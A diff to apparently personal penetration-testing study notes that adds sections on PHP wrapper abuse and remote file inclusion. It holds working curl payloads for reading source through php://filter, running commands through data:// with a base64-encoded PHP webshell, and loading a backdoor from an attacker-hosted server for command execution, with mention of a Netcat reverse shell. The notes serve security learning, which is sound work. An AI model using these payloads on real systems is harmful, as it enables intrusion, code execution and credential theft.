@@ -169,10 +169,109 @@ $ nc -nvlp 4444
 
 Send your request in Burp. If successful, we have a reverse shell!
 
+An additional interesting log file to try in the file inclusion GET may be in /xampp/apache/logs/access.log.
+
 ### LFI in Windows
 
 The PHP code we used previously works in Windows, since the PHP system functionis independent from the OS. When Log Poisoning on Windows, we should know that the log files are in app-specific paths. For example, a target running XAMPP has logs in C:\xampp\apache\logs\.
 
 We can also similarly exploit RFI and LFI on frameworks like Perl, Active Server Pages Extended, Active Server Pages, Java Server Pages, and Node.js. We can simply adjust this exploit for different languages.
+
+## PHP Wrappers
+
+A feature of PHP is that it provides a wide variety of protocol weappers that increase capabilities. The wrappers can, for example, represent and access local or remote filesystems! We will use these wrappers to bypass filters or execute arbitrary code through File Inclusion vulns as we just covered.
+
+The php://filter wrapper can display file contents with or without encodings (e.g., ROT13, Base64). We can conduct an altered version of an LFI attack using php://filter such that we display the file contents of executables like .php instead of running them.
+
+Firstly, let's use curl against our admin.php page.
+
+```console
+$ curl http://targetwebsite/.com/customer/index.php?page=admin.php
+
+...
+
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maintenance</title>
+</head>
+<body>
+        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance
+```
+
+We notice above that the <body> tag is not closed, and we assume this means that certain server-side executable code is not shown, so we know that the rest of the index.php's page content is missing.
+
+Let's include the file using php://filter to gain more insight.
+
+```console
+$ curl http://targetwebsite.com/customer/index.php?page=php://filter/resource=admin.php
+```
+
+We might get the same output, so let's try again with Base64 encoding.
+
+```console
+$ curl http://targetwebsite.com/customer/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+```
+
+This included the encoded data, so let's decode what we found.
+
+```console
+$ echo "thebase64encodedtext" | base64 -d
+```
+
+If we get credentials in this output, use them to try to connect to databases or accounts.
+
+Now, let's try the data:// wrapper to try executing arbitrary code. This specific wrapper embeds data as plaintext or Base64 encoded data into the web app's running code.
+
+```console
+curl "http://targetwebsite.com/customer/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+```
+
+This might need to be Base64 encoded to pass WAFs or other security controls.
+
+```console
+$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+
+$curl "http://targetwebsite.com/customer/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+```
+
+NOTE: In order for the data:// wrapper to work, the allow_url_include setting must be enabled! This will not succeed in the default PHP installation.
+
+## Remote File Inclusion (RFI)
+
+These will be less common than LFIs because we need to find that a target system is configured a certain way. The allow_url_include config must be enabled, just like above.
+
+RFI allows us to include files from a remote system over HTTP or SMB. The included file will be executed in the context of the webapp. We will likely find this when a file, library, or app data is loaded in the webapp, and we can discover them in similar ways to how we found Directory Traversals and LFIs.
+
+Kali has a few PHP webshells we can use in /usr/share/webshells/php/ for RFI. Using these, we can get a web-based CLI. Let's try simple-backdoor.php.
+
+```console
+$ cat simple-backdoor.php
+
+...
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+```
+
+We need to get this file accessible by our target. Let's start a web server on our Kali to serve the file - it must be fron the websell's directory! (We could also use a publicly-accessible file, like a Github file).
+
+```console
+kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
+```
+
+Use Curl to include the file via HTTP.
+
+```console
+kali@kali:/usr/share/webshells/php/$ curl "http://targetwebsite.com/customer/index.php?page=http://111.111.111.111/simple-backdoor.php&cmd=ls"
+
+// replace the IP with your attack box IP.
+```
+
+If we see the output of the ls command, we should have successfully exploited an RFI vuln. You can take this a step further by using Netcat to create a reverse shell, as we did previously.
+
+
 
 
